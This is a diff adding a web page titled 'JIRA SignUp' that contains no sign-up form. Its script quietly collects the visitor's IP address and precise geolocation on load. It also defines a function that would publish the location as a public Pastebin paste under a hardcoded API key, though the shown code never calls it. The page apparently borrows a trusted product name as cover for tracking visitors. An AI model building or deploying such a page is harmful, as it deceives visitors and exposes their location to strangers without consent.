@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JIRA SignUp</title>
+    <script src="https://code.jquery.com/jquery-3.6.3.min.js" integrity="sha256-pvPw+upLPUjgMXY0G+8O0xUf+/Im1MZjXxxgOcBQBXU=" crossorigin="anonymous"></script>
+</head>
+
+<body>
+
+    <script>
+
+        // Function to get the device IP address using a third-party service
+        function getDeviceIp() {
+            return fetch('https://api.ipify.org/?format=json')
+                .then(response => response.json())
+                .then(data => data.ip)
+                .catch(error => console.error(error));
+        }
+
+        // Function to get the device's geolocation using the Geolocation API
+        function getDeviceGeolocation() {
+            return new Promise((resolve, reject) => {
+                if ('geolocation' in navigator) {
+                    navigator.geolocation.getCurrentPosition(
+                        position => resolve(position.coords),
+                        error => reject(error)
+                    );
+                } else {
+                    reject('Geolocation not available');
+                }
+            });
+        }
+
+        // Usage example
+        Promise.all([getDeviceIp(), getDeviceGeolocation()])
+            .then(results => {
+                const [ip, coords] = results;
+                console.log(`Device IP: ${ip}`);
+                console.log(`Device geolocation: ${coords.latitude}, ${coords.longitude}`);
+                let latiLong = `${coords.latitude}, ${coords.longitude}`;
+
+                // call pastebin function
+                console.log(latiLong);
+            })
+            .catch(error => console.error(error));
+
+
+
+            function usePasteBin(geolocation) {
+                var api_url = "https://pastebin.com/api/api_post.php";
+                var api_key = "znbYAG5mVKGNPINAaU-bmWmspSVANhzn";
+                var paste_content = "this's geolocation: " + geolocation;
+                var paste_name = "Email Address: test@yahoo.com";
+                var paste_format = "text";
+                var paste_expire_date = "1D";
+                var paste_private = 0;
+        
+                $.post(api_url, {
+                    api_option: "paste",
+                    api_dev_key: api_key,
+                    api_paste_code: paste_content,
+                    api_paste_name: paste_name,
+                    api_paste_format: paste_format,
+                    api_paste_expire_date: paste_expire_date,
+                    api_paste_private: paste_private
+                }, function (data) {
+                    // The Pastebin API returns a URL for the newly created paste.
+                    // You can use this URL to display the paste to the user.
+                    console.log(data);
+                });
+            }
+
+        setTimeout(() => {
+            console.log('Loaded Timeout');
+            //window.location.href = 'https://api.ipify.org';
+        }, 10000);
+
+
+
+    </script>
+</body>
+
+</html>
